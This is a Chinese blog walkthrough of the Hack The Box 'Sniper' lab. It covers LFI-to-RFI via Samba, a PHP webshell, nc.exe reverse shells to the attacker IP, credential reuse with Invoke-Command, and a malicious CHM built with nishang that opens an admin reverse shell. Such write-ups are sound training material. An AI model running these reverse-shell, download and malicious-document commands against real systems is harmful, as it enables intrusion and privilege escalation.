---
layout:     encrypted
title:      "Hackthebox Sniper writeup/Walkthrough/攻略"
subtitle:   "根据 HTB ToS 本文需要密码 8位文章上传日期(2020xxxx) 若确有困难，请联系我"
date:       2020-03-11 02:28:00
author:     "WuJ"
header-img: "img/post-bg-htb-sniper.jpg"
header-mask: 0.20
tags:
    - HTB
    - 渗透测试
    - WINDOWS 提权
catalog: true
---

## 0x00 简介

- WINDOWS 提权
- 利用 Samba 服务实现从 LFI 到 RFI 的绕过
- nc 反弹 powershell 
- 利用 PSCredential 越权远程执行 Invoke-Command
- 恶意 CHM 的制作与利用

## 0x01 信息收集

照例先上 nmap

```shell
root@kali:~# nmap -sS -sV -sC -T4 -v -p- 10.10.10.151
Host is up (0.33s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn?
445/tcp   open  microsoft-ds?
49667/tcp open  unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h01m53s, deviation: 0s, median: 7h01m53s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-03-09 07:56:10
|_  start_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 00:56
Completed NSE at 00:56, 0.00s elapsed
Initiating NSE at 00:56
Completed NSE at 00:56, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4950.78 seconds
           Raw packets sent: 329883 (14.515MB) | Rcvd: 2167 (94.980KB)
```

发现开启了 80 web 服务，135端口，139端口，SMB 的445端口和49667的不明端口

打开网页寻找信息![Xnip2020-03-09_01-05-12](https://tva1.sinaimg.cn/large/00831rSTgy1gco72m0w22j31c00u0apt.jpg)

发现有两个可疑页面，一个是 http://10.10.10.151/user/login.php 用户注册，一个是 http://10.10.10.151/blog/index.php 

在 http://10.10.10.151/blog/index.php 中发现可以切换语言（http://10.10.10.151/blog/?lang=blog-en.php）

![Xnip2020-03-10_01-44-03](https://tva1.sinaimg.cn/large/00831rSTgy1gco7cffwvuj31d90u0thx.jpg)

这里可能存在 LFI 漏洞，尝试查看 hosts 文件和 win.ini 来验证

```php
10.10.10.151/blog/?lang=\windows\win.ini
10.10.10.151/blog/?lang=\windows\system32\drivers\etc\hosts
```

![Xnip2020-03-10_01-45-20](https://tva1.sinaimg.cn/large/00831rSTgy1gco7dnp57bj30y40u0qas.jpg)

![Xnip2020-03-10_01-33-08](https://tva1.sinaimg.cn/large/00831rSTgy1gco7840iyfj30w40u0ams.jpg)

[文件包含攻击初学者指南（LFI / RFI）](https://www.jianshu.com/p/8803aff98bfa)

之后尝试 RFI ，但 http 协议的都失败了，因为 RFI 需要的条件太严格了

> 在 allow_url_include = On 以及 allow_url_fopen = On 时，才允许远程包含文件，而默认情况下allow_url_include = Off

这里就需要尝试使用 LFI 绕过限制。下面这篇文章写得非常详细，我们可以通过 SMB 服务实现 RFI

[Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)

## 0x02 从 LFI 到 RFI 再反弹 powershell 获取 user.txt

首先清空本机的 Samba 配置文件（最好提前备份），之后将上文给出的配置写进去（主要是给任意匿名用户读取 smb 文件夹的权限），最后重启 Samba 服务

```shell
1. mkdir /var/www/html/pub/  创建 samba 分享文件夹，位置名称随意

2. chmod 0555 /var/www/html/pub/
   chown -R nobody:nogroup /var/www/html/pub/ 配置权限

3. echo > /etc/samba/smb.conf

4. 写入
[global]
workgroup = WORKGROUP
server string = Samba Server %v
netbios name = indishell-lab
security = user
map to guest = bad user
name resolve order = bcast host
dns proxy = no
bind interfaces only = yes

[ica]  //这里可以改成自己的名字
path = /var/www/html/pub
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody

5. service smbd restart  重启服务
```

在 win 机器下发现已经可以访问

![Xnip2020-03-09_01-08-44](https://tva1.sinaimg.cn/large/00831rSTgy1gco828tdbdj30pw0a8gm0.jpg)

### 上传 webshell

推荐几个好用的 webshell

[WhiteWinterWolf's PHP web shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

[Alfa team shell](http://getalfa.rf.gd/?i=2)

下载后放进 smb 文件夹下，尝试 RFI 成功

![Xnip2020-03-09_01-16-16](https://tva1.sinaimg.cn/large/00831rSTgy1gco89059l7j31c00u0nog.jpg)

### 反弹 shell

只靠 webshell 无法反弹 shell，所以尝试上传一个 nc.exe。但在根目录下没有权限，所以需要先建一个 Temp 文件夹，成功上传 nc.exe 并反弹 shell

![image-20200310160117025](https://tva1.sinaimg.cn/large/00831rSTgy1gcow44wycsj328e0psjww.jpg)

`.\nc.exe 10.10.15.11 4444 -e powershell.exe`

![Xnip2020-03-09_01-44-20](https://tva1.sinaimg.cn/large/00831rSTgy1gcp6ffeoh3j31pe0san77.jpg)

获得了普通用户的权限，之后在其中搜寻信息，在下面文件夹中发现了 db.php，里面有 db user 的密码。

![Xnip2020-03-09_01-44-55](https://tva1.sinaimg.cn/large/00831rSTgy1gcp6g8s5hij30u70u0nbr.jpg)

同时我们还发现靶机中还存在一个用户 Chris，我们需要根据 Chris 的用户凭证实现越权，获取其 shell

### 越权获取 shell

通过下列命令将 Chris 的凭证添加进 PSCredential，之后使用 Invoke-Command 远程执行 nc 反弹 shell

```shell
$secpasswd = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('sniper\chris',$secpasswd)
Invoke-Command -ComputerName sniper -Credential $cred -ScriptBlock {C:\Temp\nc.exe 10.10.15.11 4445 -e powershell.exe}
```

但这是出现 nc 的执行权限问题，有两种方法解决

![Xnip2020-03-10_17-46-10](https://tva1.sinaimg.cn/large/00831rSTgy1gcp6symd9yj31e40fkjz6.jpg)

#### 方法一

修改 nc.exe 的权限，允许任意用户直接运行

首先查看 nc.exe 原本的权限，之后修改权限

![image-20200310174933649](https://tva1.sinaimg.cn/large/00831rSTgy1gcp6o8jvc5j313e0d6dh4.jpg)

再次查看权限，发现权限修改成功

![image-20200310175336704](https://tva1.sinaimg.cn/large/00831rSTgy1gcp6p0bpejj313c0gumza.jpg)

重新远程反弹 shell，成功获取用户 Chris 的 shell

![image-20200310175612690](https://tva1.sinaimg.cn/large/00831rSTgy1gcp6pi79kcj31e60imtcj.jpg)

#### 方法二

既然默认用户下的 nc 无权运行，那就向用户 Chris 上传一个新的 nc

我们先开启本地 kali 的 web 服务，将 nc.exe 放进对应文件夹，之后远程执行下列命令，从我们本地服务器将 nc 下载保存至用户 Chris 的目录下

```shell
Invoke-Command -ComputerName sniper -Credential $cred -ScriptBlock {cd C:\Users\Chris\Documents\;$url="http://10.10.15.11/nc.exe";$output="C:\Users\Chris\Documents\nc.exe";Invoke-WebRequest -Uri $url -Outfile $output;dir}
```

![image-20200310183924496](https://tva1.sinaimg.cn/large/00831rSTgy1gcp6qtqkdyj31e80nawl0.jpg)

再远程反弹 shell，成功

![image-20200310184122085](https://tva1.sinaimg.cn/large/00831rSTgy1gcp6qughzqj31e20go42x.jpg)

**以上部分的详细解释可以参考之前的博客**

在 Desktop 下找到 user.txt

![Xnip2020-03-09_01-59-21](https://tva1.sinaimg.cn/large/00831rSTgy1gcp6vrztn7j315c0e60va.jpg)

## 0x03 制作恶意 CHM 获取 root.txt

在 Chris 目录下，发现 instructions.chm 文件。

![image-20200311001701917](https://tva1.sinaimg.cn/large/00831rSTgy1gcpafywx61j31440g2q5m.jpg)



![1](https://tva1.sinaimg.cn/large/00831rSTgy1gcpd6siwoyj30uq0h2tem.jpg)CHM(Microsoft Compiled HTML Help) 文件是微软的帮助文档，也常被制作电子书。如果被以管理员权限打开时，可以触发其中隐藏的恶意代码执行。那现在的问题就是如何制作恶意 CHM 以及如何使其被管理员打开

之后，我们又在 C:\docs 目录下发现一个 note.txt，提示我们 Chris 的老板正在等她完成剩下的工作，并让其将成品放在该目录下

![image-20200311012422017](https://tva1.sinaimg.cn/large/00831rSTgy1gcpce03vi0j31420o4jw2.jpg)

我们查看 docs 目录的权限，发现是管理员权限，这说明我们可以制作一个恶意 CHM 反弹 shell 来提权

> dir /q 是用于显示文件所有信息的 cmd 命令，在 Powershell 下无法使用
>
> cmd /r 在 Powershell 下使用 cmd 命令并退出 cmd

![image-20200311014810994](https://tva1.sinaimg.cn/large/00831rSTgy1gcpd2t7akkj31460ka0xt.jpg)

### Out-CHM 制作恶意 CHM

有很多关于制作恶意 CHM 的方法，使用 nishang 的 Out-CHM.ps1 是比较方便的一种 [nishang/Client/Out-CHM.ps1](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1)

> Nishang 是一款针对 Powershell 的渗透测试工具，集成了框架、脚本和各类 Payload

首先下载并安装微软 [HTML Help Workshop](https://www.microsoft.com/en-us/download/confirmation.aspx?id=21138)  如果出现下面的错误，多半是因为用户名包含中文，最好新建一个账户

![image-20200311012146658](https://tva1.sinaimg.cn/large/00831rSTgy1gcpcbbrz53j30qo0bc74x.jpg)

安装好之后就可以运行 Out-CHM 脚本了，首先将 ps1 脚本 import 进本地 Powershell （下面两种方法都可以）

![image-20200311015547134](https://tva1.sinaimg.cn/large/00831rSTgy1gcpdapqh1lj30si088mxz.jpg)

之后构造 payload 如下

```shell
Out-CHM -Payload "cd C:\wuj1n9\;./nc.exe 10.10.14.116 4446 -e powershell" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

`-payload` 中的内容即为 CHM 被打开后自动运行的命令

`-HHCPath` 为 HTML Help Workshop 的位置，默认都是这个位置

运行后会生成 `doc.chm`，将其放进 kali 的 web 服务文件夹下，使用 `Invoke-WebRequest` 传入靶机的 `C:\Docs` 目录下

![image-20200311020753022](https://tva1.sinaimg.cn/large/00831rSTgy1gcpdnb7kv6j31j20iowkz.jpg)

```shell
Invoke-WebRequest -Uri "http://10.10.14.116/doc.chm" -Outfile "C:\Docs\doc.chm"
```

![image-20200311020102228](https://tva1.sinaimg.cn/large/00831rSTgy1gcpdg6gvykj31b40j2q71.jpg)

注意到此时已经将恶意 CHM 上传成功，但每次过一会就消失了，意味着 Chris 的老板打开过该文件了。提前新建终端打开 nc 监听 payload 中写的端口，几秒后发现成功获取管理员权限的 shell

![image-20200311020345470](https://tva1.sinaimg.cn/large/00831rSTgy1gcpdj00nklj318a0u0n2t.jpg)

获取 root.txt

![image-20200311021008746](https://tva1.sinaimg.cn/large/00831rSTgy1gcpdpmrwa6j30ya0gyac5.jpg)

## 0x04 总结

Thanks！

该靶机涉及的知识非常多，各类提权姿势，值得仔细研究~


















